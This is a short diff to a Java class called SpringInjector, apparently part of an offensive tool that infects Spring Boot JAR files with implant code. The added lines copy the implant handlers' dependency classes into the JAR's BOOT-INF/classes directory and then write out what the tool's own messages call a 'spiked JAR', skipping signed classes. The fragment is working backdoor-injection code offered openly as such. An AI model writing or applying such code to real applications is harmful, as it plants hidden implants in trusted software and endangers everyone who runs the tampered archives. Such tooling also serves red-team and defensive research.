@@ -97,6 +97,32 @@ public class SpringInjector {
             System.out.println("[-] Found signed classes. These were not considered for infection.");
         }
 
+        // Add any dependency classes needed for the implant
+        if (didInfect) {
+            Map<String, byte[]> allDependencies = new HashMap<>();
+            allDependencies.putAll(implantSpringConfigHandler.getDependencies());
+            allDependencies.putAll(implantComponentHandler.getDependencies());
+            // Since this injector involves two different implant handlers, do a bit of manual exclusion of themselves
+            allDependencies.remove(convertToJarEntryPathName(implantSpringConfigHandler.getImplantClassName()));
+            allDependencies.remove(convertToJarEntryPathName(implantComponentHandler.getImplantClassName()));
+            // Also note that the dependencies are not renamed in any way
+            // Any custom classes bundled with the implant will contain the whole package name etc
+
+            for (Map.Entry<String, byte[]> dependencyEntry : allDependencies.entrySet()) {
+                String fileName = dependencyEntry.getKey();
+                byte[] fileContent = dependencyEntry.getValue();
+
+                JarEntry newJarEntry = new JarEntry("BOOT-INF/classes/" + fileName);
+                try {
+                    fiddler.addNewEntry(newJarEntry, fileContent);
+                } catch (ZipException e) {
+                    System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
+                    didInfect = false;
+                    break;
+                }
+            }
+        }
+
         if (didInfect) {
             fiddler.write(outputJar);
             System.out.println("[+] Wrote spiked JAR to " + outputJar);
